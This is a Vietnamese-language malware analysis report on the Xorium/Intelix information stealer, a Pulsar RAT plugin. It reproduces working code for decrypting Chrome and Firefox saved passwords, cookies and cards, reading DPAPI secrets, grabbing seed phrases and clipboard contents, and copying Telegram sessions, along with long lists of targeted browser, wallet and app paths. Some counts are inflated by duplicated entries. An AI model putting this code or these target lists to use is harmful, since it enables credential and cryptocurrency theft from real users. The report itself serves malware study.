# BÁO CÁO PHÂN TÍCH KỸ THUẬT SÂU: XORIUM STEALER PULSAR

> **Tài liệu nội bộ nghiên cứu mã độc**  
> **Ngày phân tích**: 31/01/2026  
> **Người phân tích**: Malware Analyst  
> **Mức độ**: Tuyệt mật - Chỉ dùng cho nghiên cứu

---

## 1. TỔNG QUAN DỰ ÁN

### 1.1 Thông tin cơ bản
- **Tên mã độc**: Xorium Stealer Pulsar (Intelix Stealer)
- **Phiên bản**: 2.1.0 (Client), 2.0.0 (Server)
- **Ngôn ngữ**: C# (.NET Framework 4.7.2)
- **Kiến trúc**: Plugin cho Pulsar RAT Framework
- **Tác giả**: @aesxor / dead artis
- **Mục đích**: Information Stealer (Đánh cắp thông tin)

### 1.2 Cấu trúc dự án
```
Xorium Stealer Pulsar/
├── Pulsar.Plugin.Client/          # 114+ file .cs
│   ├── Intelix/Helper/            # 40+ helper classes
│   │   ├── Encrypted/             # 15+ crypto classes
│   │   ├── Sql/                   # SQLite & BerkeleyDB
│   │   ├── Hashing/               # PBKDF2, PBE
│   │   └── Data/                  # InMemoryZip, Counter, Paths
│   ├── Intelix/Targets/           # 70+ target modules
│   │   ├── Browsers/              # Chromium, Gecko, Crypto
│   │   ├── Messangers/            # 12 messengers
│   │   ├── Games/                 # 10 game platforms
│   │   ├── Vpn/                   # 16 VPN clients
│   │   ├── Crypto/                # Desktop + Grabber
│   │   ├── Device/                # System info, WiFi, Screenshot
│   │   └── Applications/          # 20+ FTP/Remote/Dev apps
│   └── Pulsar/Plugins/Client/     # Entry point
├── Pulsar.Plugin.Server/          # Server control plugin
└── README.md + README_EN.md       # Documentation
```

---

## 2. PHÂN TÍCH KIẾN TRÚC KỸ THUẬT

### 2.1 Interface Design (ITarget)

Tất cả modules thu thập đều implement interface `ITarget`:

```csharp
public interface ITarget
{
    void Collect(InMemoryZip zip, Counter counter);
}
```

**Ưu điểm:**
- Dễ dàng thêm target mới
- Parallel processing đồng nhất
- Thread-safe với Concurrent collections

### 2.2 Plugin Architecture

**Client Plugin** (`Stealer.cs`):
- Implement `IUniversalPlugin`
- PluginId: "stealer_plugin"
- Version: "2.1.0"
- SupportedCommands: ["collect"]

**Server Plugin** (`ArchiveCollectorServer.cs`):
- Implement `IServerPlugin`
- Tích hợp context menu Pulsar RAT
- Quản lý config Discord/Telegram
- Nhận response và lưu file ZIP

---

## 3. CƠ CHẾ MÃ HÓA & GIẢI MÃ CHI TIẾT

### 3.1 Danh sách 15+ Thuật toán Mã hóa

| # | Thuật toán | File | Mục đích |
|---|-----------|------|----------|
| 1 | **DPAPI** | `DpApi.cs` | Giải mã Windows protected data |
| 2 | **AES-GCM-256** | `AesGcm.cs`, `AesGcm256.cs` | Chrome v10/v20 decryption |
| 3 | **ChaCha20-Poly1305** | `ChaCha20Poly1305.cs` | Modern browser encryption |
| 4 | **TripleDES-CBC** | `TripleDes.cs` | Firefox password decryption |
| 5 | **NSS Decryptor** | `NSSDecryptor.cs` | Legacy Firefox support |
| 6 | **PBKDF2** | `PBKDF2.cs` | Key derivation |
| 7 | **PBE (Password-Based Encryption)** | `PBE.cs` | Firefox key4.db |
| 8 | **Blowfish** | `Blowfish.cs` | Symmetric encryption |
| 9 | **RC4** | `RC4Crypt.cs` | Stream cipher |
| 10 | **AES-CBC-256** | `AesGcm256.cs` | General purpose |
| 11 | **HMAC-SHA1** | `TripleDes.cs` | Message authentication |
| 12 | **SHA1** | `TripleDes.cs` | Hashing |
| 13 | **XOR Cipher** | `Xor.cs` | Simple obfuscation |
| 14 | **CNG (Cryptography Next Gen)** | `CngDecryptor.cs` | Windows CNG API |
| 15 | **ASN.1 DER Parser** | `Asn1Der.cs` | Parse certificate data |

### 3.2 Chi tiết DPAPI Implementation

```csharp
public static byte[] Decrypt(byte[] bCipher)
{
    // Sử dụng CryptUnprotectData từ crypt32.dll
    DataBlob pDataIn = new DataBlob { cbData = bCipher.Length, pbData = gcHandle.AddrOfPinnedObject() };
    
    if (!NativeMethods.CryptUnprotectData(
        ref pDataIn, ref empty, ref pOptionalEntropy,
        IntPtr.Zero, ref Prompt, 0, ref pDataOut))
        return null;
    
    // Copy decrypted data
    byte[] destination = new byte[pDataOut.cbData];
    Marshal.Copy(pDataOut.pbData, destination, 0, pDataOut.cbData);
    return destination;
}
```

**Windows API:** `CryptUnprotectData` từ `crypt32.dll`

### 3.3 Chi tiết AES-GCM-256 (Chrome Decryption)

**Cấu trúc dữ liệu mã hóa:**
```
[0-2]   Version prefix: "v10" hoặc "v20"
[3-14]  12-byte nonce/IV
[15-n]  Ciphertext
[n-16:n] 16-byte authentication tag (GCM)
```

**Quy trình giải mã:**
```csharp
public static byte[] DecryptBrowser(byte[] encryptedData, byte[] masterKey10, byte[] masterKey20, bool checkprefix)
{
    // 1. Extract version prefix
    string version = Encoding.ASCII.GetString(encryptedData, 0, 3);
    
    // 2. Extract 12-byte nonce
    byte[] nonce = new byte[12];
    Buffer.BlockCopy(encryptedData, 3, nonce, 0, 12);
    
    // 3. Extract ciphertext và tag
    int ciphertextLength = encryptedData.Length - 15 - 16;
    byte[] ciphertext = new byte[ciphertextLength];
    byte[] tag = new byte[16];
    Buffer.BlockCopy(encryptedData, 15, ciphertext, 0, ciphertextLength);
    Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
    
    // 4. Chọn master key theo version
    byte[] key = version == "v20" ? masterKey20 : masterKey10;
    
    // 5. Decrypt using AES-GCM-256
    return AesGcm256.Decrypt(key, nonce, null, ciphertext, tag);
}
```

### 3.4 Chi tiết TripleDES-CBC (Firefox)

**Key Derivation từ key4.db:**
```csharp
public void ComputeVoid()
{
    // Bước 1: SHA1(globalSalt + masterPassword)
    byte[] combined = new byte[globalSalt.Length + masterPassword.Length];
    Array.Copy(globalSalt, 0, combined, 0, globalSalt.Length);
    Array.Copy(masterPassword, 0, combined, globalSalt.Length, masterPassword.Length);
    byte[] hash1 = SHA1.ComputeHash(combined);
    
    // Bước 2: SHA1(hash1 + entrySalt)
    byte[] combined2 = new byte[hash1.Length + entrySalt.Length];
    Array.Copy(hash1, 0, combined2, 0, hash1.Length);
    Array.Copy(entrySalt, 0, combined2, hash1.Length, entrySalt.Length);
    byte[] hash2 = SHA1.ComputeHash(combined2);
    
    // Bước 3: HMAC-SHA1 để tạo key và IV
    using (HMACSHA1 hmac = new HMACSHA1(hash2))
    {
        byte[] hash3 = hmac.ComputeHash(paddedEntrySalt);
        byte[] hash4 = hmac.ComputeHash(...);
        
        // Key = 24 bytes (3DES key)
        this.Key = new byte[24];
        Array.Copy(destinationArray, 0, this.Key, 0, 24);
        
        // IV = 8 bytes (CBC mode)
        this.Vector = new byte[8];
        Array.Copy(destinationArray, destinationArray.Length - 8, this.Vector, 0, 8);
    }
}
```

### 3.5 ASN.1 DER Parser Tùy chỉnh

```csharp
public class Asn1Der
{
    public enum Type
    {
        Integer = 2,
        BitString = 3,
        OctetString = 4,
        Null = 5,
        ObjectIdentifier = 6,
        Sequence = 48
    }
    
    public Asn1DerObject Parse(byte[] toParse)
    {
        // Parse ASN.1 structure recursively
        for (int index = 0; index < toParse.Length; ++index)
        {
            switch ((Type)toParse[index])
            {
                case Type.Integer:
                    // Parse Integer
                case Type.OctetString:
                    // Parse Octet String
                case Type.Sequence:
                    // Parse Sequence (recursive)
            }
        }
    }
}
```

**Mục đích:** Parse certificate và encrypted data từ Firefox NSS databases.

---

## 4. SQLITE PARSER TÙY CHỈNH

### 4.1 Kiến trúc Custom SQLite Parser

```csharp
public class SqLite
{
    private readonly byte[] _fileBytes;      // Raw database bytes
    private readonly ulong _pageSize;        // Page size (thường 4096)
    private readonly ulong _dbEncoding;      // 1=UTF-8, 2=UTF-16le, 3=UTF-16be
    private SqliteMasterEntry[] _masterTableEntries;
    private TableEntry[] _tableEntries;
    
    public SqLite(byte[] basedata)
    {
        _fileBytes = basedata;
        _pageSize = ConvertToULong(16, 2);    // Offset 16-17: Page size
        _dbEncoding = ConvertToULong(56, 4);  // Offset 56-59: Encoding
        ReadMasterTable(100L);                // Start at offset 100
    }
}
```

### 4.2 SQLite File Format Header

| Offset | Size | Description |
|--------|------|-------------|
| 0-15 | 16 | Header string: "SQLite format 3\0" |
| 16-17 | 2 | Page size (big-endian) |
| 18 | 1 | File format write version |
| 19 | 1 | File format read version |
| 20 | 1 | Reserved space per page |
| 21-23 | 3 | Max embedded payload fraction |
| 24-27 | 4 | File change counter |
| 28-31 | 4 | Database size in pages |
| 32-35 | 4 | Page number of first freelist page |
| 36-39 | 4 | Total freelist pages |
| 40-43 | 4 | Schema cookie |
| 44-47 | 4 | Schema format number |
| 48-51 | 4 | Default page cache size |
| 52-55 | 4 | Page number of largest root b-tree |
| 56-59 | 4 | Database text encoding |
| 60-63 | 4 | User version |

### 4.3 Các Table được Parse

| Database | Table | Dữ liệu quan trọng |
|----------|-------|-------------------|
| `Login Data` | `logins` | origin_url, username_value, password_value |
| `Login Data For Account` | `logins` | Account-specific passwords |
| `Cookies` | `cookies` | host_key, name, value, encrypted_value |
| `Network\Cookies` | `cookies` | Network-isolated cookies |
| `Web Data` | `autofill` | name, value, value_lower |
| `Web Data` | `credit_cards` | name_on_card, card_number_encrypted, expiration_
| `Web Data` | `token_service` | service, scope, encrypted_token |
| `Web Data` | `masked_credit_cards` | Masked card numbers |
| `Web Data` | `masked_ibans` | Masked IBANs |
| `Ya Passman Data` | `logins` | Yandex passwords |
| `Ya Credit Cards` | `records` | Yandex credit cards |

### 4.4 Ưu điểm của Custom Parser

1. **Không cần lock file**: Đọc raw bytes thay vì dùng SQLite connection
2. **Bypass file locking**: Có thể đọc database đang được browser sử dụng
3. **Không cần dependencies**: Không phụ thuộc System.Data.SQLite
4. **Stealth**: Không tạo connection strings hay temp files

---

## 5. FILE GRABBER & SEED PHRASE HUNTER

### 5.1 Kiến trúc Module Grabber

```csharp
public class Grabber : ITarget
{
    // Giới hạn kích thước
    private readonly long _sizeMinFile = 120;      // Min: 120 bytes
    private readonly long _sizeLimitFile = 6144;   // Max per file: 6KB
    private readonly long _sizeLimit = 5242880;    // Total: 5MB
    
    // Regex tìm seed phrase (BIP-39)
    private readonly Regex _seedRegex = new Regex(
        "^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$",
        RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);
    
    // Thread-safe size tracking
    private long _size;
    private long Size 
    { 
        get => Interlocked.Read(ref _size);
        set => Interlocked.Exchange(ref _size, value);
    }
}
```

### 5.2 35 Keywords Tìm kiếm

```csharp
private readonly string[] _keywords = new string[35]
{
    // Authentication
    "password", "passwd", "pwd", "pass", "login", "user", "username",
    "account", "mail", "email", "secret", "pin", "auth", "2fa", "token",
    
    // Cryptography
    "key", "private", "public", "ssh", "cert", "certificate",
    
    // Crypto Wallets
    "wallet", "mnemonic", "seed", "recovery", "phrase", "backup",
    "crypto", "btc", "eth", "usdt", "ltc", "xmr",
    
    // API/Dev
    "apikey", "api_key"
};
```

### 5.3 9 File Extensions được Quét

```csharp
private readonly string[] _seedExtensions = new string[9]
{
    ".seed",        // Seed phrase files
    ".seedphrase",  // Seed phrase backup
    ".mnemonic",    // Mnemonic backup
    ".phrase",      // Phrase backup
    ".key",         // Private keys
    ".secret",      // Secret files
    ".txt",         // Text files (generic)
    ".backup",      // Backup files
    ".wallet"       // Wallet files
};
```

### 5.4 19 Đường dẫn Tìm kiếm

| # | Đường dẫn | Mục đích |
|---|-----------|----------|
| 1 | `%USERPROFILE%\Desktop` | Desktop files |
| 2 | `%USERPROFILE%\Documents` | Documents |
| 3 | `%USERPROFILE%\Downloads` | Downloads |
| 4 | `%USERPROFILE%\OneDrive` | OneDrive sync |
| 5 | `%USERPROFILE%\Dropbox` | Dropbox sync |
| 6 | `%USERPROFILE%\iCloudDrive` | iCloud sync |
| 7 | `%USERPROFILE%\Google Drive` | Google Drive |
| 8 | `%USERPROFILE%\YandexDisk` | Yandex Disk |
| 9 | `%USERPROFILE%\Mega` | Mega sync |
| 10 | `%APPDATA%\Evernote` | Evernote notes |
| 11 | `%APPDATA%\Standard Notes` | Standard Notes |
| 12 | `%APPDATA%\Joplin` | Joplin notes |
| 13 | `%USERPROFILE%\Wallets` | Wallet folder |
| 14 | `%USERPROFILE%\Keys` | Keys folder |
| 15 | `%USERPROFILE%\Crypto` | Crypto folder |
| 16 | `%USERPROFILE%\Backup` | Backup folder |
| 17 | `%PUBLIC%\Desktop` | Public desktop |
| 18 | `%PUBLIC%\Documents` | Public documents |
| 19 | `%USERPROFILE%` | User home |

### 5.5 Regex Seed Phrase (BIP-39)

```csharp
// Pattern: 12-24 từ, mỗi từ 3+ ký tự chữ cái
^(?:\s*\b[a-z]{3,}\b){12,24}\s*$

// Ví dụ match:
// "abandon ability able about above absent absorb abstract absurd abuse access"
// "witch collapse practice feed shame open despair creek road again ice least"
```

**BIP-39**: Bitcoin Improvement Proposal 39 - Chuẩn tạo seed phrase 12-24 từ từ danh sách 2048 từ.

---

## 6. DANH SÁCH 84+ TRÌNH DUYỆT ĐƯỢC HỖ TRỢ

### 6.1 Chromium-based (66 browsers)

| # | Browser | Path Pattern |
|---|---------|--------------|
| 1 | Google Chrome | `\Google\Chrome\User Data` |
| 2 | Microsoft Edge | `\Microsoft\Edge\User Data` |
| 3 | Brave | `\BraveSoftware\Brave-Browser\User Data` |
| 4 | Brave Nightly | `\BraveSoftware\Brave-Browser-Nightly\User Data` |
| 5 | Opera | `\Opera Software\Opera Stable` |
| 6 | Opera GX | `\Opera Software\Opera GX Stable` |
| 7 | Vivaldi | `\Vivaldi\User Data` |
| 8 | Yandex Browser | `\Yandex\YandexBrowser\User Data` |
| 9 | CocCoc | `\CocCoc\Browser\User Data` |
| 10 | 360Chrome | `\360Chrome\Chrome\User Data` |
| 11 | 360Browser | `\360Browser\Browser\User Data` |
| 12 | CentBrowser | `\CentBrowser\User Data` |
| 13 | Comodo Dragon | `\Comodo\Dragon\User Data` |
| 14 | Comodo | `\Comodo\User Data` |
| 15 | Epic Privacy | `\Epic Privacy Browser\User Data` |
| 16 | Avast Browser | `\AVAST Software\Browser\User Data` |
| 17 | CCleaner Browser | `\CCleaner Browser\User Data` |
| 18 | Torch | `\Torch\User Data` |
| 19 | Uran | `\uCozMedia\Uran\User Data` |
| 20 | Iridium | `\Iridium\User Data` |
| 21 | Maxthon | `\Maxthon\User Data` |
| 22 | Maxthon3 | `\Maxthon3\User Data` |
| 23 | Slimjet | `\Slimjet\User Data` |
| 24 | Nichrome | `\Nichrome\User Data` |
| 25 | Chromodo | `\Chromodo\User Data` |
| 26 | QIP Surf | `\QIP Surf\User Data` |
| 27 | Chromium | `\Chromium\User Data` |
| 28 | BitTorrent Maelstrom | `\BitTorrent\Maelstrom` |
| 29 | Globus VPN | `\Globus VPN\User Data` |
| 30 | Amigo | `\Amigo\User\User Data` |
| 31 | 7Star | `\7Star\7Star\User Data` |
| 32 | Mail.Ru Atom | `\Mail.Ru\Atom\User Data` |
| 33 | UCBrowser | `\UCBrowser\User Data_i18n` |
| 34 | Coowon | `\Coowon\Coowon\User Data` |
| 35 | AOL Shield | `\AOL\AOL Shield\User Data` |
| 36 | Element Browser | `\Element Browser\User Data` |
| 37 | Sputnik | `\Sputnik\Sputnik\User Data` |
| 38 | Elements Browser | `\Elements Browser\User Data` |
| 39 | Tencent QQBrowser | `\Tencent\QQBrowser\User Data` |
| 40 | Naver Whale | `\Naver\Naver Whale\User Data` |
| 41 | Baidu Browser | `\Baidu\BaiduBrowser\User Data` |
| 42 | CatalinaGroup Citrio | `\CatalinaGroup\Citrio\User Data` |
| 43 | Google Chrome (x86) | `\Google(x86)\Chrome\User Data` |
| 44 | MapleStudio ChromePlus | `\MapleStudio\ChromePlus\User Data` |
| 45 | NVIDIA GeForce Experience | `\NVIDIA Corporation\NVIDIA GeForce Experience` |
| 46 | Sleipnir ChromiumViewer | `\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer` |
| 47 | Falkon | `\Falkon\Profiles` |
| 48 | Hola | `\Hola\chromium_profile` |
| 49 | GhostBrowser | `\GhostBrowser` |
| 50 | Colibri | `\ColibriBrowser` |
| 51 | Min | `\Min\User Data` |
| 52 | Kinza | `\Kinza\User Data` |
| 53 | Blisk | `\Blisk\User Data` |
| 54 | Xvast | `\Xvast\User Data` |
| 55 | CryptoTab | `\CryptoTab Browser` |
| 56 | Kometa | `\Kometa\User Data` |
| 57 | liebao | `\liebao\User Data` |
| 58 | Chedot | `\Chedot\User Data` |
| 59 | K-Melon | `\K-Melon\User Data` |
| 60 | Orbitum | `\Orbitum\User Data` |
| 61 | Lulumi | `\Lulumi-browser` |
| 62 | kingpin | `\kingpinbrowser` |
| 63 | Battle.net | `\Battle.net` |
| 64 | Lulumi | `\Lulumi-browser` |
| 65 | kingpin | `\kingpinbrowser` |
| 66 | Battle.net | `\Battle.net` |

### 6.2 Gecko-based (18 browsers)

| # | Browser | Path Pattern |
|---|---------|--------------|
| 1 | Mozilla Firefox | `\Mozilla\Firefox\Profiles` |
| 2 | Waterfox | `\Waterfox\Profiles` |
| 3 | Thunderbird | `\Thunderbird\Profiles` |
| 4 | Pale Moon | `\Moonchild Productions\Pale Moon\Profiles` |
| 5 | SeaMonkey | `\Mozilla\SeaMonkey\Profiles` |
| 6 | K-Meleon | `\K-Meleon\Profiles` |
| 7 | IceDragon | `\Comodo\IceDragon\Profiles` |
| 8 | Cyberfox | `\8pecxstudios\Cyberfox\Profiles` |
| 9 | BlackHawk | `\NETGATE Technologies\BlackHawk\Profiles` |
| 10 | Mypal | `\Mypal\Profiles` |
| 11 | Ghostery | `\Ghostery Browser\Profiles` |
| 12 | Undetectable | `\Undetectable\Profiles` |
| 13 | Sielo | `\Sielo\profiles` |
| 14 | conkeror | `\conkeror.mozdev.org\conkeror\Profiles` |
| 15 | Netscape | `\Netscape\Navigator\Profiles` |
| 16 | SlimBrowser | `\FlashPeak\SlimBrowser\Profiles` |
| 17 | Avant | `\Avant Profiles` |
| 18 | Flock | `\Flock\Profiles` |

---

## 7. WINDOWS API SỬ DỤNG

### 7.1 Process & Memory APIs

```csharp
// psapi.dll - Process Status API
[DllImport("psapi.dll", SetLastError = true)]
public static extern bool GetProcessMemoryInfo(
    IntPtr hProcess,
    out PROCESS_MEMORY_COUNTERS_EX ppsmemCounters,
    uint cb);

[DllImport("psapi.dll", SetLastError = true)]
public static extern bool EnumProcesses([Out] uint[] lpidProcess, uint cb, out uint lpcbNeeded);

// kernel32.dll - Core Windows API
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool QueryFullProcessImageName(
    IntPtr hProcess, int dwFlags, StringBuilder lpExeName, ref int lpdwSize);
```

### 7.2 DPAPI & Cryptography APIs

```csharp
// crypt32.dll - Cryptographic API
[DllImport("crypt32.dll", SetLastError = true)]
public static extern bool CryptUnprotectData(
    ref DataBlob pDataIn,
    ref string szDataDescr,
    ref DataBlob pOptionalEntropy,
    IntPtr pvReserved,
    ref CryptprotectPromptstruct pPromptStruct,
    int dwFlags,
    ref DataBlob pDataOut);

// ncrypt.dll - Cryptography Next Generation (CNG)
[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, int dwFlags);

[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);

[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, 
    byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
```

### 7.3 System Information APIs

```csharp
// kernel32.dll - System info
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool GetVolumeInformation(
    string lpRootPathName,
    StringBuilder lpVolumeNameBuffer,
    int nVolumeNameSize,
    out uint lpVolumeSerialNumber,
    out uint lpMaximumComponentLength,
    out uint lpFileSystemFlags,
    StringBuilder lpFileSystemNameBuffer,
    int nFileSystemNameSize);

[DllImport("kernel32.dll")]
public static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

// user32.dll - Display info
[DllImport("user32.dll", CharSet = CharSet.Unicode)]
public static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

[DllImport("user32.dll")]
public static extern IntPtr GetDesktopWindow();

[DllImport("user32.dll")]
public static extern IntPtr GetWindowDC(IntPtr hWnd);
```

---

## 8. CẤU TRÚC BÁO CÁO (counter.txt)

### 8.1 Header ASCII Art

```
    ____      __       _______  __
   /  _/___  / /____  / /  _/ |/ /
   / // __ \/ __/ _ \/ // / |   / 
 _/ // / / / /_/  __/ // / /   |  
/___/_/ /_/\__/\___/_/___//_/|_|  
                                   
               InteliX by dead artis
```

### 8.2 Cấu trúc Sections

```
[Keys]  [--N--]  [Browser1, Browser2, ...]
       [Browser Profile] MasterKey_Version: HEX_VALUE

[Browsers]  [--N--]  [Browser1, Browser2, ...]
  - Profile Name
       [Cookies N]
       [Passwords N]
       [CreditCards N]
       [AutoFill N]
       [RestoreToken N]
       [MaskCreditCard N]
       [MaskedIban N]

[Applications]  [--N--]  [App1, App2, ...]
     [Name AppName]
       - file1.txt
       - file2.log

[Games]  [--N--]  [Game1, Game2, ...]
     [Name GameName]
       - config/file1
       - save/file2

[Messangers]  [--N--]  [Messenger1, ...]
     [Name MessengerName]
       - data/file1
       - session/file2

[Vpns]  [--N--]  [VPN1, VPN2, ...]
     [Name VPNName]
       - config.xml

[CryptoChromium]  [--N--]
       - Extension1
       - Extension2

[CryptoDesktop]  [--N--]  [Wallet1, Wallet2, ...]
     [WalletName]
       - wallet/file1
       - keys/file2

[FilesGrabber]  [--N--]
       - path/to/file1.txt
       - path/to/file2.key
```

---

## 9. CÁC MODULE TARGET CHI TIẾT

### 9.1 Browsers Module (Chromium.cs, Gecko.cs)

**Chromium Data Collection:**
- Local State parsing (JSON)
- Master key extraction (v10, v20)
- SQLite database parsing (Login Data, Cookies, Web Data)
- Parallel processing per profile
- AES-GCM-256 decryption

**Gecko Data Collection:**
- profiles.ini parsing
- key4.db / key3.db parsing
- logins.json parsing
- NSS decryption (3DES-CBC)
- BerkeleyDB parsing

### 9.2 Crypto Wallets Module

**Desktop Wallets (CryptoDesktop.cs):**
- 20+ wallet paths
- File collection (wallet.dat, seed, keys)
- Registry parsing

**Browser Extensions (CryptoChromium.cs, CryptoGecko.cs):**
- 30+ extension IDs
- Local Storage extraction
- IndexedDB extraction

### 9.3 Device Info Module

**SystemInfo.cs:**
- OS version, architecture
- Hardware specs (CPU, RAM, Disk)
- Username, hostname, domain
- IP address (internal/external)
- Screen resolution

**WifiKey.cs:**
- netsh wlan export profile
- XML parsing
- Key extraction (WPA/WPA2)

**ScreenShot.cs:**
- Desktop capture
- Multi-monitor support
- PNG/JPEG format

### 9.4 Applications Module

**FTP Clients:**
- FileZilla (sitemanager.xml, recentservers.xml)
- WinSCP (registry, INI files)
- CyberDuck (plist, bookmarks)
- CoreFTP, FTPNavigator, FTPRush, FTPGetter, FTPCommander

**Remote Access:**
- AnyDesk (system.conf, user.conf)
- TeamViewer (registry, logs)
- RDP (saved RDP files)
- RDCMan, Sunlogin, MobaXterm, Xmanager, PuTTY

**Development:**
- JetBrains (licenses, configs)
- GitHub Desktop (token, config)
- Ngrok (config.yml)
- Navicat (ncx, connections)

---

## 9.5 CHI TIẾT MODULES ĐẶC BIỆT

### 9.5.1 SystemInfo - Thu thập Thông tin Hệ thống Sâu

**Các thông tin thu thập:**

```csharp
// 6 sections song song
Task<string> task1 = Task.Run(() => BuildUserSection());      // User, Machine, HWID, Clipboard
Task<string> task2 = Task.Run(() => BuildNetworkSection());   // IP, MAC, Adapter
Task<string> task3 = Task.Run(() => BuildSystemSection());    // OS, CPU, RAM, Uptime
Task<string> task4 = Task.Run(() => BuildDrivesSection());    // Disk drives info
Task<string> task5 = Task.Run(() => BuildGpuSection());       // GPU info
Task<string> task6 = Task.Run(() => BuildBasicSection());     // Basic system info
```

**HWID Generation:**
```csharp
// Kết hợp nhiều yếu tố phần cứng
values.Add("MG:" + GetMachineGuid());           // Registry MachineGuid
values.Add("CPU:" + GetCpuName());              // CPU name
values.Add("Cores:" + Environment.ProcessorCount);
values.Add("VOLS:" + GetFixedVolumeSerials());  // Volume serial numbers
values.Add("MACS:" + GetMacAddresses());        // MAC addresses
values.Add("MN:" + Environment.MachineName);    // Machine name

// SHA256 hash của tất cả
_hwid = ComputeSha256(string.Join("|", values));
```

**IP Public Detection:**
```csharp
using (WebClient webClient = new WebClient())
{
    string ip = webClient.DownloadString("http://icanhazip.com");
    _cachedIp = ip.Trim();
}
```

**Clipboard Extraction:**
```csharp
// Lấy nội dung clipboard hiện tại
string clipboard = GetClipboardTextNoTimeout();
// Có thể chứa password vừa copy, seed phrase, etc.
```

### 9.5.2 ScreenShot - Chụp Màn hình với Watermark

**Kỹ thuật chụp màn hình:**
```csharp
// Lấy desktop bounds
Rectangle bounds = Screen.PrimaryScreen.Bounds;
using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb))
{
    using (Graphics graphics = Graphics.FromImage(bitmap))
    {
        // BitBlt từ desktop window
        IntPtr hdc = graphics.GetHdc();
        IntPtr windowDc = NativeMethods.GetWindowDC(NativeMethods.GetDesktopWindow());
        NativeMethods.BitBlt(hdc, 0, 0, bounds.Width, bounds.Height, windowDc, 0, 0, 13369376);
        
        // Thêm watermark "Xorium" với hiệu ứng gradient
        using (GraphicsPath path = new GraphicsPath())
        {
            path.AddString("Xorium", font.FontFamily, (int)font.Style, font.Size, rectangleF, format);
            
            // Gradient brush tím-xanh
            using (LinearGradientBrush brush = new LinearGradientBrush(
                rectangleF, 
                Color.FromArgb(255, 85, 0, 255),   // Tím đậm
                Color.FromArgb(255, 0, 220, 255),  // Xanh cyan
                LinearGradientMode.Horizontal))
            {
                graphics.FillPath(brush, path);
            }
        }
    }
}
```

### 9.5.3 CryptoDesktop - 40+ Ví Tiền điện tử Desktop

**Danh sách đầy đủ ví được hỗ trợ:**

| # | Ví | Đường dẫn | Blockchain |
|---|-----|-----------|------------|
| 1 | **Zcash** | `%APPDATA%\Zcash` | ZEC |
| 2 | **Armory** | `%APPDATA%\Armory` | BTC |
| 3 | **Bytecoin** | `%APPDATA%\bytecoin` | BCN |
| 4 | **Jaxx** | `%APPDATA%\com.liberty.jaxx\...` | Multi |
| 5 | **Exodus** | `%APPDATA%\Exodus\exodus.wallet` | Multi |
| 6 | **Ethereum** | `%APPDATA%\Ethereum\keystore` | ETH |
| 7 | **Electrum** | `%APPDATA%\Electrum\wallets` | BTC |
| 8 | **AtomicWallet** | `%APPDATA%\atomic\Local Storage\...` | Multi |
| 9 | **Atomic** | `%APPDATA%\Atomic\Local Storage\...` | Multi |
| 10 | **Guarda** | `%APPDATA%\Guarda\Local Storage\...` | Multi |
| 11 | **Coinomi** | `%LOCALAPPDATA%\Coinomi\Coinomi\wallets` | Multi |
| 12 | **Tari** | `%APPDATA%\com.tari.universe\...` | Tari |
| 13 | **Bitcoin** | `%LOCALAPPDATA%\Bitcoin\wallets` | BTC |
| 14 | **Dash** | `%APPDATA%\DashCore\wallets` | DASH |
| 15 | **Litecoin** | `%APPDATA%\Litecoin\wallets` | LTC |
| 16 | **MyMonero** | `%APPDATA%\MyMonero` | XMR |
| 17 | **Monero** | `%APPDATA%\Monero` | XMR |
| 18 | **Vertcoin** | `%APPDATA%\Vertcoin` | VTC |
| 19 | **Groestlcoin** | `%APPDATA%\Groestlcoin` | GRS |
| 20 | **Komodo** | `%APPDATA%\Komodo` | KMD |
| 21 | **PIVX** | `%APPDATA%\PIVX` | PIVX |
| 22 | **BitcoinGold** | `%APPDATA%\BitcoinGold` | BTG |
| 23 | **Electrum-LTC** | `%APPDATA%\Electrum-LTC` | LTC |
| 24 | **Binance** | `%APPDATA%\Binance` | BNB |
| 25 | **Phantom** | `%APPDATA%\Phantom\IndexedDB\...` | SOL |
| 26 | **Coin98** | `%APPDATA%\Coin98\IndexedDB\...` | Multi |
| 27 | **MathWallet** | `%APPDATA%\MathWallet\IndexedDB\...` | Multi |
| 28 | **LedgerLive** | `%APPDATA%\Ledger Live` | Hardware |
| 29 | **TrezorSuite** | `%APPDATA%\TrezorSuite` | Hardware |
| 30 | **MyEtherWallet** | `%APPDATA%\MyEtherWallet` | ETH |
| 31 | **MyCrypto** | `%APPDATA%\MyCrypto` | ETH |
| 32 | **MetaMask Desktop** | `%APPDATA%\MetaMask\IndexedDB\...` | ETH |
| 33 | **TrustWallet Desktop** | `%APPDATA%\TrustWallet\IndexedDB\...` | Multi |

**Registry Wallets (Bitcoin, Litecoin, Dash):**
```csharp
// Đọc từ Registry
string name = $"Software\{sWalletRegistry}\{sWalletRegistry}-Qt";
string path = Registry.CurrentUser.OpenSubKey(name)?.GetValue("strDataDir")?.ToString();
string walletPath = Path.Combine(path, "wallets");
```

### 9.5.4 Telegram - Thu thập Session Data

**Tdata Folder Analysis:**
```csharp
// Tìm tất cả folder tdata
Parallel.ForEach(FindAllMatches("tdata"), tdata =>
{
    string targetPath = Path.GetFileName(tdata.Remove(tdata.Length - 6, 6)) + GenerateHashTag();
    Copydata(tdata, targetPath, zip, counterApplications);
});
```

